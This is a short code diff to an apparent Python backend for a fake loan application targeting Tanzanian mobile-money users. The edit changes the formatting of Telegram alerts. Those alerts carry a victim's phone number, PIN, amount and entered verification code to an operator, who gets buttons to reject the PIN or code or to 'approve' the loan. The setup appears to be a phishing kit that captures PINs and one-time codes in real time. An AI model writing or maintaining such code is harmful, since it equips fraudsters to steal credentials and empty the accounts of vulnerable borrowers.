@@ -50,7 +50,7 @@ add_column()
 
 def send_telegram(message, reply_markup=None):
     try:
-        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
+        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
         if reply_markup: payload['reply_markup'] = reply_markup
         requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
     except Exception as e: print(f'Telegram error: {e}')
@@ -179,7 +179,7 @@ def submit_code():
     loan = c.fetchone()
     if loan:
         phone, expected_code, amount, pin = loan
-        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n💰 Amount: TZS {amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n<code>{entered_code}</code>'
+        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n💰 Amount: TZS {amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n```\n{entered_code}\n```'
         keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'},{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
         send_telegram(msg, keyboard)
     conn.close()
